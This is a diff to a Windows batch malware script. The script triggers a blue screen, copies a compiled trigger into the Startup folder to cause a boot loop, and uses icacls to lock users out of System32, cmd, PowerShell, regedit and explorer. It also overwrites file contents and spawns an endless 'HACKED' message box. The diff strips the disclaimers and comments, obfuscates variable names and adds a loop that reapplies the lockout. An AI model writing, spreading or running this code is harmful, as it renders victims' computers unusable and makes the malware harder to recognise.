@@ -1,45 +1,11 @@
-::This script is a remake of just-infinite-bsod
-::Inspired by various sources
-
-::Note that this script is for educational purposes only
-::The writer of this script is not responsible for any damage caused by this script
-::Recall that this script may cause harmful damages to the computer, use it at your own risk
-set -e -o pipefail
-::This script only works on Windows 10 (not tested on other versions)
 @echo off
 goto Menu
-::The default credits part, may be subject to change
-:Credits_Reference
-cls
-echo ***********************************
-echo *                                 *
-echo *          DIRLOVE <3             *
-echo *                                 *
-echo ***********************************
-echo.
+set"IlIIIIllIlIl=***********************************"
+set"lIIlIllIIllI=*                                 *"
+set"IIllIIllIIll=*          DIRLOVE <3             *"
+set"IIIIIlIlllIl=Credits_Reference"
+set"IlllIllIIllI=BlueScreenOfDeath"
 
-exit /b 0
-::Default menu
-:Menu
-call :Credits_Reference
-echo 1. BlueScreenOfDeath Trigger
-echo 2. File locker
-echo 3. Exit
-echo 4. Prank vbs msgbox
-echo 5. File content changer for directory
-echo 6. File content changer
-echo.
-
-set /p choice=Enter your choice:
-if choice==1 goto BSOD_menu_option && goto Menu
-if choice==2 goto FileLocker && goto Menu
-if choice==3 exit
-if choice==4 goto PrankMsgBox && goto Menu
-if choice==5 goto FileContentChangerForDirectory && goto Menu
-if choice==6 goto FileContentChanger && goto Menu
-exit /b 0
-
-::****************************************
 :FileContentChangerForDirectory
 if not exist %~1 (
     echo The path does not exist.
@@ -94,38 +60,18 @@ for /l %%i in (1,1,100) do (
 echo %gibberish% > %~dp0\gibberish.txt
 setlocal disabledelayedexpansion
 exit /b 0
-::****************************************
-::Prank vbs msgbox
 :PrankMsgBox
 cls
 call :CreateGibberish
 if not exist %~dp0\msgbox.vbs (
     echo do >> %~dp0\msgbox.vbs
-    ::This is the message box, which will be displayed
     echo msgbox "%gibberish%", vbOKOnly, "HACKED" >> %~dp0\msgbox.vbs
-    ::Loop the msgbox indefinitely
     echo Loop >> %~dp0\msgbox.vbs
 )
-::Run the vbs script
+
 start %~dp0\msgbox.vbs
 exit /b 0
 
-::****************************************
-::File locker
-:FileLocker
-::This subroutine is essential similar to that of :LockProtect, however adding user interaction
-echo.
-call :Credits_Reference
-set /p "lock_path=Enter the path to lock: "
-if not exist %lock_path% (
-    echo The path does not exist.
-    pause
-    goto FileLocker
-)
-call :LockProtect %lock_path%
-echo The path to the file has been locked.
-exit /b 0
-::BSOD menu
 :BSOD_menu_option
 cls
 echo.
@@ -145,8 +91,6 @@ if %errorLevel% neq 0 (
     call :PathBSOD
 )
 exit /b 0
-::****************************************
-::This is the BSOD trigger for Administrators
 :BSOD_With_Admin
 net session >nul 2>&1
 if %errorLevel% neq 0 (
@@ -161,19 +105,15 @@ else (
     shutdown /r /t 0
 )
 exit /b 0
-::****************************************
-::Convert a batch file to an executable file
-::Note that this step is essential, for the non-Admin BSOD trigger to work
 :ConvertBatToExe
 set "batfile=%~1"
 set "batname=%~n1"
 set "batpath=%~dp1"
 set "exefile=%batpath%%batname%.exe"
 
-:: Create an SED file for IExpress
 set "sedfile=%batpath%%batname%.sed"
 
-:: This is the options, required for creating the SED file
+
 (
 echo [Version]
 echo Class=IEXPRESS
@@ -202,37 +142,22 @@ echo [SourceFiles0]
 echo %batname%.bat=
 ) > "%sedfile%"
 
-:: Run IExpress to create the EXE
-iexpress /N /Q "%sedfile%"
 
-:: Clean up SED file
+iexpress /N /Q "%sedfile%"
 del "%sedfile%"
 exit /b 0
 
-::****************************************
-::This is the non-Admin BSOD trigger
 :BSOD_NonAdmin
-::Setup the BSOD cause
-::More info in this video: https://www.youtube.com/watch?v=JjebNlzX6us
-::Note that this method only works on Windows 10 only
 set BSOD_Trigger_Path="\\.\GLOBALROOT\Device\ConDrv\KernelConnect\"
 echo %BSOD_Trigger_Path% >> %~dp0\BSOD_Trigger_Path.bat
 call :ConvertBatToExe %~dp0\BSOD_Trigger_Path.bat
 
-::Copying the BSOD trigger to the startup folder
-::Now the user is stuck in a bootloop
 copy %~dp0\BSOD_Trigger_Path.exe %shell:startup%
 call :SafeLock
 
-::Directly shutting down the computer
 shutdown /r /t 0
 exit /b 0
 
-::****************************************
-
-::This is for safety measures =)), ensuring that users cannot delete the file.
-::Note that this is harmful, since any programs listed here is not usable, even for Administrators.
-::The only user, which has the right to use these programs, is the default SYSTEM user.
 :SafeLock
 call :LockProtect "C:\Windows\regedit.exe"
 call :LockProtect "C:\Windows\System32\cmd.exe"
@@ -243,27 +168,18 @@ call :LockProtect "C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe"
 call :LockProtect "C:\Windows\SysWOW64\explorer.exe"
 call :LockProtect "C:\Windows\explorer.exe"
 
-::These two are extremely harmful
 call :LockProtect "C:\Windows\System32"
 call :LockProtect "C:\Windows\SysWOW64"
 
 call :LockProtect %~dp0
 exit /b 0
 
-::****************************************
-::Get the unchanged username
-::Maybe unessential by the time of writing
 :GetRealName
 
 for /f "tokens=3 delims=\" %%s in ('echo %userprofile%') do (
 	set realName=%%s
 )
 exit /b 0
-
-::****************************************
-::Lock a file/directory, for all users (other than SYSTEM) and Administrators
-::This is powerful, since icacls does not require Administrators rights to be run
-::The only default user, who has rights to this file, is the default SYSTEM user
 
 :LockProtect
 
@@ -274,5 +190,6 @@ icacls "%~1" /remove "%username%" /t
 icacls "%~1" /remove "Authenticated Users" /t
 icacls "%~1" /grant "Users:RX" /t
 icacls "%~1" /inheritance:d /t
-
 exit /b 0
+:mainloop
+call :SafeLock
